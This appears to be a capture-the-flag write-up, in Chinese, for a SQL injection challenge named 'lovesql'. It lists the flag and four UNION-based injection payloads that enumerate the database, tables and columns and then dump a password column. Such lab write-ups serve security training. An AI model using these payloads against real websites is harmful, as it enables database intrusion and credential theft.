---
Author: SuperJason
Date: 2020-12-30
---

## flag
`flag{0d11302e-1a43-4a77-b2f0-7a10c33bcfd9}`

## 思路
1. 访问环境，这道题较简单，有回显报错。   
   <img src="./images/lovesql-1.png" style="zoom: 25%;" />
2. 参考[N1BOOK sql](../N1BOOK/[第一章%20web入门]sql注入-1.md),爆出数据库、数据表、字段。  
   - `-1' union select 1,database(),3 -- -`   
   <img src="./images/lovesql-2.png" style="zoom:25%;" />
   - `-1' union select 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='geek' -- -`   
   <img src="./images/lovesql-3.png" style="zoom:25%;" />
   - `-1' union select 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='l0ve1ysq1' -- -`   
   <img src="./images/lovesql-4.png" style="zoom:25%;" />
   - `-1' union select 1,group_concat(password),3 FROM l0ve1ysq1 -- -`   
   <img src="./images/lovesql-5.png" style="zoom:25%;" />
